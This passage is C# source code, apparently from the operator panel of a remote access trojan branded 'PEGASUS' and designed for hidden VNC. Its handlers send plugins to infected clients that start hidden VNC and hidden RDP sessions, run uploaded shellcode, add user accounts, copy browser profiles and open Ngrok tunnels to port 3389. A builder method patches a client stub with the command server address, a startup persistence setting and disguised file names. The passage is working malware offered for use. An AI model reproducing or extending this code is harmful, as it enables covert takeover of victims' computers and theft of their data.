                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The normalInstallToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "normalinstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The normalUninstallToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The justForFunToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\FC.dll");

                foreach (var client in GetSelectedClients())
                {
                    var fun = (FormFun)Application.OpenForms["fun:" + client.ID];
                    if (fun == null)
                    {
                        fun = new FormFun
                        {
                            Name = "fun:" + client.ID,
                            Text = "fun:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        fun.Show();
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The runShellcodeToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = false;
                    openFileDialog.Filter = "(*.bin)|*.bin";
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "Shellcode";
                        packet.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ML.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The uploadsPluginToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void uploadsPluginToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hVNCStart";
                    packet.ForcePathObject("port").AsString = "4448";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ZEUS.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

#pragma warning disable CS1998 // This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread.
        /// <summary>
        /// The uploadPluginToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        /// <returns>The <see cref="Task"/>.</returns>
        private async Task uploadPluginToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    foreach (var client in GetSelectedClients())
                        new Thread(() =>
                        {
                            try
                            {
                                var thread1 = Task.Factory.StartNew(() => fun1());
                                Task.WaitAll(thread1);
                                //server.Send(StartExplorer, 0, 0);
                            }
                            catch
                            {
                            }
                        }).Start();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The startToolStripMenuItem2_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void startToolStripMenuItem2_Click(object sender, EventArgs e)
        {

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    foreach (var client in GetSelectedClients())
                    {
                        await uploadPluginToolStripMenuItem_Click(sender, e);
                        var formdn = new VNCForm();
                        formdn.ShowDialog();

                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The stopToolStripMenuItem3_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        new Thread(() =>
                        {
                            try
                            {
                                var thread2 = Task.Factory.StartNew(() => fun2());
                                Task.WaitAll(thread2);
                            }
                            catch
                            {
                            }
                        }).Start();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
        }

        /// <summary>
        /// The fun1.
        /// </summary>
        public void fun1()
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hVNCStart";
                    packet.ForcePathObject("port").AsString = "4447";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ZEUS.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The fun2.
        /// </summary>
        public void fun2()
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "hVNCStop";
                        //packet.ForcePathObject("port").AsString = "6667";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ZEUS.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());


                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
        }

        /// <summary>
        /// The builderToolStripMenuItem1_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void builderToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {

            using (var formBuilder = new FormBuilder())
            {
                formBuilder.ShowDialog();
            }
        }

        /// <summary>
        /// The blockClientsToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void blockClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The documentationToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void documentationToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The settingsToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The aboutToolStripMenuItem1_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
       

        /// <summary>
        /// The ReleaseCapture.
        /// </summary>
        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        /// <summary>
        /// The SendMessage.
        /// </summary>
        /// <param name="hwnd">The hwnd<see cref="IntPtr"/>.</param>
        /// <param name="wmsg">The wmsg<see cref="int"/>.</param>
        /// <param name="wparam">The wparam<see cref="int"/>.</param>
        /// <param name="lparam">The lparam<see cref="int"/>.</param>
        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        /// <summary>
        /// The guna2Panel1_MouseDown.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="MouseEventArgs"/>.</param>
        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        /// <summary>
        /// The guna2PictureBox1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The panel1_Paint.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="PaintEventArgs"/>.</param>
        private void panel1_Paint(object sender, PaintEventArgs e)
        {
        }

        /// <summary>
        /// The guna2PictureBox1_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2PictureBox1_Click_1(object sender, EventArgs e)
        {
            Close();
        }

        /// <summary>
        /// The tasksControlToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void tasksControlToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The onToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void onToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!LISTVIEWTASKS.Visible)
                //guna2Transition1.HideSync(listView1);
                guna2Transition1.ShowSync(LISTVIEWTASKS);

            else
                //guna2Transition1.ShowSync(listView1);
                guna2Transition1.HideSync(LISTVIEWTASKS);
        }

        /// <summary>
        /// The offToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void offToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // guna2Transition2.HideSync(guna2ShadowPanel1);
            guna2Transition1.HideSync(panel3);
            guna2Transition1.HideSync(panel2);
        }

        /// <summary>
        /// The guna2PictureBox2_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Normal;
        }

        /// <summary>
        /// The guna2PictureBox3_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2PictureBox3_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        /// <summary>
        /// The guna2PictureBox4_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2PictureBox4_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Maximized;
        }

        /*
        private ushort GetPortSafe()
        {
            //var portValue = numPort.Value.ToString(CultureInfo.InvariantCulture);
          //  ushort port;
           // return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }
        */
        /// <summary>
        /// The btnStartL_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnStartL_Click(object sender, EventArgs e)
        {
            // ushort port = GetPortSafe();

            // Properties.Settings.Default.Ports = Convert.ToString(port);
            Properties.Settings.Default.Save();

            if (!File.Exists(Settings.CertificatePath))
                Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
            else
                Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);


            new Thread(() => { Connect(); }).Start();
            Listener.ForeColor = Color.FromArgb(54, 193, 214);
        }

        /// <summary>
        /// The btnStopL_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnStopL_Click(object sender, EventArgs e)
        {
            // ushort port = GetPortSafe();
            Listener.ForeColor = Color.Red;
            Listener.Text = "Not Listening ";
            //guna2Transition2.HideSync(buttonspanel);
            var listener = new Listener();
            try
            {
                //ew Thread(() =>
                //
                // listener.Disconnect(port);
                //).Start();
            }
            catch
            {
            }
        }

        /// <summary>
        /// The pictureBox1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void pictureBox1_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The guna2Panel3_MouseLeave.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2Panel3_MouseLeave(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The MouseIsOverControl.
        /// </summary>
        /// <param name="buttonspanel">The buttonspanel<see cref="Panel"/>.</param>
        /// <returns>The <see cref="bool"/>.</returns>
        private bool MouseIsOverControl(Panel buttonspanel)
        {
            return buttonspanel.ClientRectangle.Contains(buttonspanel.PointToClient(Cursor.Position));
        }

        /// <summary>
        /// The guna2Panel3_CursorChanged.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2Panel3_CursorChanged(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The SaveSettings.
        /// </summary>
        private void SaveSettings()
        {
            try
            {
                Properties.Settings.Default.Save();
            }
            catch
            {
            }
        }

        /// <summary>
        /// Defines the alphabet.
        /// </summary>
        private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

        /// <summary>
        /// The getRandomCharacters.
        /// </summary>
        /// <returns>The <see cref="string"/>.</returns>
        public string getRandomCharacters()
        {
            var sb = new StringBuilder();
            for (var i = 1; i <= new Random().Next(10, 20); i++)
            {
                //var randomCharacterPosition = FrmBuilder.random.Next(0, alphabet.Length);
                //sb.Append(alphabet[randomCharacterPosition]);
            }

            return sb.ToString();
        }

        // public static string export = Path.Combine(Directory.GetCurrentDirectory(), "exterminal.exe");
        /// <summary>
        /// Defines the terminal.
        /// </summary>
        public static string terminal = Path.Combine(Directory.GetCurrentDirectory(), "ClientH.exe");

        /// <summary>
        /// The WriteSettings.
        /// </summary>
        /// <param name="asmDef">The asmDef<see cref="ModuleDefMD"/>.</param>
        /// <param name="AsmName">The AsmName<see cref="string"/>.</param>
        /// <param name="IP">The IP<see cref="string"/>.</param>
        /// <param name="port">The port<see cref="string"/>.</param>
        private void WriteSettings(ModuleDefMD asmDef, string AsmName, string IP, string port)
        {
            //ushort port = GetPortSafe();
            try
            {
                var key = Methods.GetRandomString(32);
                var aes = new Aes256(key);

                foreach (var type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Program")
                        foreach (var method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (var i = 0; i < method.Body.Instructions.Count(); i++)
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "#PORT#")
                                        method.Body.Instructions[i].Operand = Convert.ToString(port);

                                    if (method.Body.Instructions[i].Operand.ToString() == "#IPDNS#")
                                        method.Body.Instructions[i].Operand = IP;

                                    if (method.Body.Instructions[i].Operand.ToString() == "#ID#")
                                        method.Body.Instructions[i].Operand = "PEGASUS_HVNC";

                                    //if (method.Body.Instructions[i].Operand.ToString() == "#MUTEX#")
                                    //    method.Body.Instructions[i].Operand = FrmBuilder.RandomMutex(9);

                                    if (method.Body.Instructions[i].Operand.ToString() == "#STARTUP#")
                                        method.Body.Instructions[i].Operand = "True";
                                    if (method.Body.Instructions[i].Operand.ToString() == "#PATH#")
                                        method.Body.Instructions[i].Operand = "-1";

                                    if (method.Body.Instructions[i].Operand.ToString() == "#FOLDER#")
                                        method.Body.Instructions[i].Operand = "kkuoAJzUj";

                                    if (method.Body.Instructions[i].Operand.ToString() == "#FILENAME#")
                                        method.Body.Instructions[i].Operand = "CeMXFJGYO.exe";

                                    if (method.Body.Instructions[i].Operand.ToString() == "#WDEX#")
                                        method.Body.Instructions[i].Operand = "False";

                                    if (method.Body.Instructions[i].Operand.ToString() == "#HHVNC#")
                                        method.Body.Instructions[i].Operand = "True";
                                }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

        /// <summary>
        /// Defines the export.
        /// </summary>
        public static string export = Path.Combine(Directory.GetCurrentDirectory(), "exterminal.exe");


        /// <summary>
        /// The exterminate.
        /// </summary>
        public void exterminate()
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hVNCStart";
                    packet.ForcePathObject("PORT").AsString = "4448";
                    packet.ForcePathObject("MUTEX").AsString = "01234567890";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\PegShark.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        // client.LV.ForeColor = Color.FromArgb(54, 193, 214);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The uploadPlugin.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        /// <returns>The <see cref="Task"/>.</returns>
        private async Task uploadPlugin(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {

                    new Thread(() =>
                    {
                        try
                        {
                            var thread1 = Task.Factory.StartNew(() => exterminate());
                            Task.WaitAll(thread1);

                        }
                        catch
                        {
                        }
                    }).Start();
                }
                catch
                {

                }
        }

        /// <summary>
        /// The connectToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void connectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "Login";


                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The HRDPconnectToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void HRDPconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hRDPStart";


                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The addUSERToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void addUSERToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "AddUser";
                    //packet.ForcePathObject("Option").AsString = "shutdown";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        //client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The HRDPcleanUnistallToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void HRDPcleanUnistallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hRDPRemove";
                    //packet.ForcePathObject("Option").AsString = "shutdown";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The copyProfileToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void copyProfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hRDPCopy";
                    //packet.ForcePathObject("Option").AsString = "shutdown";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The connectToolStripMenuItem_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void connectToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string token = InputDialog.Show("\nType Token.\n\n");
            if (string.IsNullOrEmpty(token))
                return;
            else
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "NgrokStart";
                        packet.ForcePathObject("proto").AsString = "tcp";
                        packet.ForcePathObject("port").AsString = "3389";
                        packet.ForcePathObject("token").AsString = token;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Ngrok.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());

                        }

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        /// <summary>
        /// The addUserPEGASUSPEGASUSToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void addUserPEGASUSPEGASUSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hRDPUser";
                    //packet.ForcePathObject("Option").AsString = "shutdown";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        //client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The ExecuteRDP.
        /// </summary>
        /// <returns>The <see cref="Task"/>.</returns>
        private async Task ExecuteRDP()
        {

            await allinone();
        }

        /// <summary>
        /// The allinone.
        /// </summary>
        /// <returns>The <see cref="Task"/>.</returns>
        private async Task allinone()
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    foreach (var client in GetSelectedClients())
                        new Thread(() =>
                        {
                            try
                            {
                                var thread1 = Task.Factory.StartNew(() => tak1());
                                var thread2 = Task.Factory.StartNew(() => tak2());
                                var thread3 = Task.Factory.StartNew(() => tak3());
                                Task.WaitAll(thread1, thread2, thread3);

                            }
                            catch
                            {
                            }
                        }).Start();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The tak1.
        /// </summary>
        private void tak1()
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hRDPStart";
                    //packet.ForcePathObject("Option").AsString = "shutdown";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        //client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The tak2.
        /// </summary>
        private void tak2()
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "hRDPUser";
                    //packet.ForcePathObject("Option").AsString = "shutdown";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
